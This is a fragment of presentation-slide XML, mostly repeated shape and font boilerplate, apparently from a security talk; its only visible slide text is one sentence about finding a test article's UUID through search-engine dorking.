                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>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3" name="Shape 253"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="254" name="Google Shape;254;g28d5137f758_0_17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5" name="Google Shape;255;g28d5137f758_0_17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b="1" lang="en" sz="1500">
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>I google-dorked and found a news article that had been used for testing and grabbed the UUID.</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="1500">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:ea typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
              <a:sym typeface="Courier New"/>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3" name="Shape 263"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="264" name="Google Shape;264;g258cbd63437_0_57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5" name="Google Shape;265;g258cbd63437_0_57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0" name="Shape 270"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="271" name="Google Shape;271;g258cbd63437_0_40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2" name="Google Shape;272;g258cbd63437_0_40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9" name="Shape 279"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="280" name="Google Shape;280;g258cbd63437_0_4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1" name="Google Shape;281;g258cbd63437_0_4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8" name="Shape 288"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="289" name="Google Shape;289;g258cbd63437_0_4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0" name="Google Shape;290;g258cbd63437_0_4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8" name="Shape 298"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="299" name="Google Shape;299;g258cbd63437_0_4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0" name="Google Shape;300;g258cbd63437_0_4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7" name="Shape 307"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="308" name="Google Shape;308;g258cbd63437_0_4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9" name="Google Shape;309;g258cbd63437_0_4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6" name="Shape 316"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="317" name="Google Shape;317;g258cbd63437_0_4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8" name="Google Shape;318;g258cbd63437_0_4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5" name="Shape 325"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="326" name="Google Shape;326;g258cbd63437_0_45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7" name="Google Shape;327;g258cbd63437_0_4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4" name="Shape 334"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="335" name="Google Shape;335;g258cbd63437_0_46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6" name="Google Shape;336;g258cbd63437_0_4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3" name="Shape 343"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="344" name="Google Shape;344;g258cbd63437_0_47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5" name="Google Shape;345;g258cbd63437_0_47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2" name="Shape 352"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="353" name="Google Shape;353;g258cbd63437_0_48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4" name="Google Shape;354;g258cbd63437_0_48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2" name="Shape 362"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="363" name="Google Shape;363;g258cbd63437_0_49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4" name="Google Shape;364;g258cbd63437_0_49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1" name="Shape 371"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="372" name="Google Shape;372;g258cbd63437_0_49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3" name="Google Shape;373;g258cbd63437_0_49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0" name="Shape 380"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="381" name="Google Shape;381;g258cbd63437_0_50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2" name="Google Shape;382;g258cbd63437_0_50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9" name="Shape 389"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="Google Shape;390;g258cbd63437_0_5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1" name="Google Shape;391;g258cbd63437_0_5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8" name="Shape 398"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="399" name="Google Shape;399;g258cbd63437_0_5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0" name="Google Shape;400;g258cbd63437_0_5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8" name="Shape 408"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="409" name="Google Shape;409;g258cbd63437_0_5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0" name="Google Shape;410;g258cbd63437_0_5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7" name="Shape 417"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418" name="Google Shape;418;g258cbd63437_0_5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9" name="Google Shape;419;g258cbd63437_0_5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7" name="Shape 427"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="428" name="Google Shape;428;g258cbd63437_0_54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9" name="Google Shape;429;g258cbd63437_0_5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7" name="Shape 437"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="438" name="Google Shape;438;g258cbd63437_0_55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9" name="Google Shape;439;g258cbd63437_0_5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6" name="Shape 446"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="447" name="Google Shape;447;g258cbd63437_0_56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48" name="Google Shape;448;g258cbd63437_0_5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5" name="Shape 455"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="456" name="Google Shape;456;g28d5137f758_0_3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57" name="Google Shape;457;g28d5137f758_0_3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2" name="Shape 462"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="463" name="Google Shape;463;g28d5137f758_0_18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64" name="Google Shape;464;g28d5137f758_0_1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1" name="Shape 471"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="472" name="Google Shape;472;g28d5137f758_0_20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73" name="Google Shape;473;g28d5137f758_0_20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0" name="Shape 480"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="481" name="Google Shape;481;g28d5137f758_0_2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82" name="Google Shape;482;g28d5137f758_0_2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9" name="Shape 489"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="490" name="Google Shape;490;g28d5137f758_0_2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91" name="Google Shape;491;g28d5137f758_0_2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8" name="Shape 498"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="499" name="Google Shape;499;g28d5137f758_0_2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00" name="Google Shape;500;g28d5137f758_0_2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7" name="Shape 507"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="508" name="Google Shape;508;g28d5137f758_0_2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09" name="Google Shape;509;g28d5137f758_0_2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6" name="Shape 516"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="517" name="Google Shape;517;g28d5137f758_0_25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18" name="Google Shape;518;g28d5137f758_0_2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5" name="Shape 525"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="526" name="Google Shape;526;g28d5137f758_0_27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7" name="Google Shape;527;g28d5137f758_0_2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4" name="Shape 534"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="535" name="Google Shape;535;g28d5137f758_0_28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36" name="Google Shape;536;g28d5137f758_0_28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3" name="Shape 543"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="544" name="Google Shape;544;g28d5137f758_0_29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45" name="Google Shape;545;g28d5137f758_0_29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2" name="Shape 552"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="553" name="Google Shape;553;g28d5137f758_0_26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54" name="Google Shape;554;g28d5137f758_0_26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0" name="Shape 560"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="561" name="Google Shape;561;g28d5137f758_0_3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62" name="Google Shape;562;g28d5137f758_0_3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9" name="Shape 569"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="570" name="Google Shape;570;g28d5137f758_0_3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71" name="Google Shape;571;g28d5137f758_0_3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7" name="Shape 577"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="578" name="Google Shape;578;g28d5137f758_0_3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79" name="Google Shape;579;g28d5137f758_0_3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7" name="Shape 587"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="588" name="Google Shape;588;g258cbd63437_0_40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9" name="Google Shape;589;g258cbd63437_0_40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4" name="Shape 594"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="595" name="Google Shape;595;g258cbd63437_0_58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96" name="Google Shape;596;g258cbd63437_0_58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3" name="Shape 603"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="604" name="Google Shape;604;g258cbd63437_0_60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05" name="Google Shape;605;g258cbd63437_0_60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2" name="Shape 612"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="613" name="Google Shape;613;g258cbd63437_0_6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14" name="Google Shape;614;g258cbd63437_0_6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1" name="Shape 621"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="622" name="Google Shape;622;g258cbd63437_0_6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23" name="Google Shape;623;g258cbd63437_0_6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0" name="Shape 630"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="631" name="Google Shape;631;g258cbd63437_0_6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32" name="Google Shape;632;g258cbd63437_0_6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9" name="Shape 639"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="640" name="Google Shape;640;g258cbd63437_0_6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41" name="Google Shape;641;g258cbd63437_0_6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8" name="Shape 648"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="649" name="Google Shape;649;g258cbd63437_0_6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50" name="Google Shape;650;g258cbd63437_0_6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7" name="Shape 657"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="658" name="Google Shape;658;g258cbd63437_0_6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59" name="Google Shape;659;g258cbd63437_0_6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6" name="Shape 666"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="667" name="Google Shape;667;g258cbd63437_0_67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68" name="Google Shape;668;g258cbd63437_0_67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5" name="Shape 675"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="676" name="Google Shape;676;g258cbd63437_0_69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77" name="Google Shape;677;g258cbd63437_0_69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4" name="Shape 684"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="685" name="Google Shape;685;g258cbd63437_0_70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86" name="Google Shape;686;g258cbd63437_0_70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4" name="Shape 694"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="695" name="Google Shape;695;g258cbd63437_0_7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96" name="Google Shape;696;g258cbd63437_0_7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4" name="Shape 704"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="705" name="Google Shape;705;g258cbd63437_0_7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06" name="Google Shape;706;g258cbd63437_0_7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4" name="Shape 714"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="715" name="Google Shape;715;g258cbd63437_0_7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16" name="Google Shape;716;g258cbd63437_0_7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3" name="Shape 723"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="724" name="Google Shape;724;g258cbd63437_0_57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25" name="Google Shape;725;g258cbd63437_0_57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0" name="Shape 730"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="731" name="Google Shape;731;g28d5137f758_0_36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32" name="Google Shape;732;g28d5137f758_0_36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9" name="Shape 739"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="740" name="Google Shape;740;g28d5137f758_0_40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41" name="Google Shape;741;g28d5137f758_0_40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8" name="Shape 748"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="749" name="Google Shape;749;g28d5137f758_0_4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50" name="Google Shape;750;g28d5137f758_0_4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8" name="Shape 758"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="759" name="Google Shape;759;g28d5137f758_0_37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60" name="Google Shape;760;g28d5137f758_0_3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8" name="Shape 768"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
